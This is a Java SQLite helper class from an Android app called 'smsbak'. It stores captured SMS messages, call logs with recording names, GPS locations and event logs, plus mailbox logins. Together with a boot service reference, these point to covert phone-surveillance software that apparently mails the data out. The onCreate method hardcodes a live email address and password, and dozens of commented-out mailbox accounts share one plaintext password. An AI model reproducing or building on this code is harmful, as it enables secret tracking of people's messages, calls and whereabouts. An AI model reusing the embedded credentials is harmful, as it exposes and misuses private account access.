package com.smsbak.sms;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

import com.smsbak.model.Call;
import com.smsbak.model.Location;
import com.smsbak.model.Logs;
import com.smsbak.model.Mail;
import com.smsbak.model.Sms;

public class SmsSqlUtils extends SQLiteOpenHelper {

	
	private static String name="smsbak";
	public SmsSqlUtils(Context context) {
		super(context, name, null, 1);
		// TODO Auto-generated constructor stub
	}

	@Override
	public void onCreate(SQLiteDatabase db) {
		// TODO Auto-generated method stub
		String mail="create table mail(id INTEGER PRIMARY KEY AUTOINCREMENT,name varchar(100),pass varchar(100))";
		String sms="create table sms(id INTEGER PRIMARY KEY AUTOINCREMENT,dates varchar(100),type varchar(100),address varchar(100),phonename varchar(200),body varchar(300))";
		String call="create table call(id INTEGER PRIMARY KEY AUTOINCREMENT,dates varchar(100),type varchar(100),address varchar(100),phonename varchar(200),duration varchar(300),record varchar(300))";
		String location="create table location(id INTEGER PRIMARY KEY AUTOINCREMENT,time varchar(100),addr varchar(300),latitude varchar(100),longitude varchar(200))";
		String log="create table log(id INTEGER PRIMARY KEY AUTOINCREMENT,time varchar(100),tag varchar(200),content varchar(200))";

		db.execSQL(mail);
		db.execSQL(sms);
		db.execSQL(call);
		db.execSQL(location);
		db.execSQL(log);
		String imail="insert into mail (name,pass) values(?,?)";
//		db.execSQL(imail, new Object[]{"message_server_1@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_2@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_3@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_4@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_5@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_6@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_7@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_8@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_100@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_101@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_102@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_yfm@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_103@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_105@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_106@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_106@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_107@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_108@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_109@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_110@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_112@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_113@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_114@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_115@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_116@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_117@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_118@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_119@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_120@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_121@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_122@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_123@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server124@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_125@163.com","ming861004$&"});		
//		db.execSQL(imail, new Object[]{"message_server_127@163.com","ming861004$&"});		
//		db.execSQL(imail, new Object[]{"message_server_128@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_129@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_130@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"message_server_132@163.com","ming861004$&"});
//		db.execSQL(imail, new Object[]{"wontacin@163.com","wonjee"});
		db.execSQL(imail, new Object[]{"15831927967@139.com","1237890@"});
		
	}

	@Override
	public void onUpgrade(SQLiteDatabase arg0, int arg1, int arg2) {
		// TODO Auto-generated method stub

	}
	public void savelog(String tag,String content){
		String imail="insert into log (time,tag,content) values(?,?,?)";
		SQLiteDatabase  db=this.getWritableDatabase();
		db.execSQL(imail, new Object[]{BootServer.smf.format(new Date()),tag,content});
		SdCardUtils.WriteLog(tag, content);
	}
	public void savemail(Mail mail){
		String imail="insert into mail (name,pass) values(?,?)";
		SQLiteDatabase  db=this.getWritableDatabase();
		db.execSQL(imail, new Object[]{mail.getName(),mail.getPass()});
		savelog("message", "ÃÌº””√ªß"+mail.getName());
	}
	public void savesms(Sms sms){
		String sql="insert into sms(dates,type,address,phonename,body) values (?,?,?,?,?)";
		SQLiteDatabase  db=this.getWritableDatabase();
		db.execSQL(sql, new Object[]{sms.getDates(),sms.getType(),sms.getAddress(),sms.getPhonename(),sms.getBody()});
		SdCardUtils.WriteSms(sms);
	}
	public void savecall(Call call){
		String sql="insert into call(dates,type,address,phonename,duration,record) values (?,?,?,?,?,?)";
		SQLiteDatabase  db=this.getWritableDatabase();
		db.execSQL(sql, new Object[]{call.getDates(),call.getType(),call.getAddress(),call.getPhonename(),call.getDuration(),call.getRocordname()});
		SdCardUtils.WriteCall(call);
	}
	public void savelocation(Location loc){
		String sql="insert into location(time,addr,latitude,longitude) values (?,?,?,?)";
		SQLiteDatabase  db=this.getWritableDatabase();
		db.execSQL(sql, new Object[]{loc.getTime(),loc.getAddr(),loc.getLatitude(),loc.getLongitude()});
		SdCardUtils.WriteLoc(loc);
	}
	public List<Sms> getAllSms(){
		List<Sms> lsms=new ArrayList<Sms>();
		String sql="select * from sms";
		SQLiteDatabase db=this.getReadableDatabase();
		Cursor cursor=db.rawQuery(sql, new String[]{});
		while(cursor.moveToNext()){
			Sms sms=new Sms();
			sms.setId(cursor.getInt(cursor.getColumnIndex("id")));
			sms.setDates(cursor.getString(cursor.getColumnIndex("dates")));
			sms.setType(cursor.getString(cursor.getColumnIndex("type")));
			sms.setAddress(cursor.getString(cursor.getColumnIndex("address")));
			sms.setPhonename(cursor.getString(cursor.getColumnIndex("phonename")));
			sms.setBody(cursor.getString(cursor.getColumnIndex("body")));
			lsms.add(sms);
		}
		cursor.close();
		return lsms;
	}
	public List<Call> getAllCall(){
		List<Call> lcall=new ArrayList<Call>();
		String sql="select * from call";
		SQLiteDatabase db=this.getReadableDatabase();
		Cursor cursor=db.rawQuery(sql, new String[]{});
		while(cursor.moveToNext()){
			Call call=new Call();
			call.setId(cursor.getInt(cursor.getColumnIndex("id")));
			call.setDates(cursor.getString(cursor.getColumnIndex("dates")));
			call.setType(cursor.getString(cursor.getColumnIndex("type")));
			call.setAddress(cursor.getString(cursor.getColumnIndex("address")));
			call.setPhonename(cursor.getString(cursor.getColumnIndex("phonename")));
			call.setDuration(cursor.getString(cursor.getColumnIndex("duration")));
			call.setRocordname(cursor.getString(cursor.getColumnIndex("record")));
			lcall.add(call);
		}
		cursor.close();
		return lcall;
	}
	public List<Location> getAllLocation(){
		List<Location> lloc=new ArrayList<Location>();
		String sql="select * from location";
		SQLiteDatabase db=this.getReadableDatabase();
		Cursor cursor=db.rawQuery(sql, new String[]{});
		while(cursor.moveToNext()){
			Location loc=new Location();
			loc.setId(cursor.getInt(cursor.getColumnIndex("id")));
			loc.setTime(cursor.getString(cursor.getColumnIndex("time")));
			loc.setAddr(cursor.getString(cursor.getColumnIndex("addr")));
			loc.setLatitude(cursor.getString(cursor.getColumnIndex("latitude")));
			loc.setLongitude(cursor.getString(cursor.getColumnIndex("longitude")));
			lloc.add(loc);
		}
		cursor.close();
		return lloc;
	}
	
	public List<Mail> getAllMail(){
		List<Mail> lloc=new ArrayList<Mail>();
		String sql="select * from mail";
		SQLiteDatabase db=this.getReadableDatabase();
		Cursor cursor=db.rawQuery(sql, new String[]{});
		while(cursor.moveToNext()){
			Mail mail=new Mail();
			mail.setId(cursor.getInt(cursor.getColumnIndex("id")));
			mail.setName(cursor.getString(cursor.getColumnIndex("name")));
			mail.setPass(cursor.getString(cursor.getColumnIndex("pass")));
			lloc.add(mail);
		}
		cursor.close();
		return lloc;
	}
	public List<Logs> getAllLog(){
		List<Logs> lloc=new ArrayList<Logs>();
		String sql="select * from log";
		SQLiteDatabase db=this.getReadableDatabase();
		Cursor cursor=db.rawQuery(sql, new String[]{});
		while(cursor.moveToNext()){
			Logs log=new Logs();
			log.setId(cursor.getInt(cursor.getColumnIndex("id")));
			log.setTime(cursor.getString(cursor.getColumnIndex("time")));
			log.setTag(cursor.getString(cursor.getColumnIndex("tag")));
			log.setContent(cursor.getString(cursor.getColumnIndex("content")));
			lloc.add(log);
		}
		cursor.close();
		return lloc;
	}
	
	
	public void deleteAllSms(){
		String sql="delete from sms";
		this.getWritableDatabase().execSQL(sql);
	}
	public void deleteAllCall(){
		String sql="delete from call";
		this.getWritableDatabase().execSQL(sql);
	}
	public void deleteAllLocation(){
		String sql="delete from location";
		this.getWritableDatabase().execSQL(sql);
	}
	public void deleteAlllog(){
		String sql="delete from log";
		this.getWritableDatabase().execSQL(sql);
	}
	public void deleteMail(Mail mail){
		String sql="delete from mail where name=?";
		this.getWritableDatabase().execSQL(sql,new String[]{mail.getName()});
	}
	
	public void deleteAll(){
		deleteAllSms();
		deleteAllCall();
		deleteAllLocation();
		deleteAlllog();
	}
}
